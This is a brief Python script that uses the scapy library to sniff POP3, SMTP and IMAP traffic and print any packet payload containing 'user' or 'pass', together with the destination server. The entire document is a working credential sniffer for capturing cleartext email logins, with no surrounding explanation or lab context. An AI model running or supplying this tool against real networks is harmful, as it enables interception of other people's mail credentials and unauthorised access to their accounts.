from scapy.all import *

USER = "user"
PASS = "pass"

#packet callback 
def packet_callback(packet):

    if packet[TCP].payload:
        mail_packet  = str(packet[TCP].payload)

        if USER in mail_packet.lower() or PASS in mail_packet.lower():

            print("[*] Server: %s"%packet.dst)
            print("[*] %s"%packet[TCP].payload)

#fire up sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143" ,prn=packet_callback ,store=0)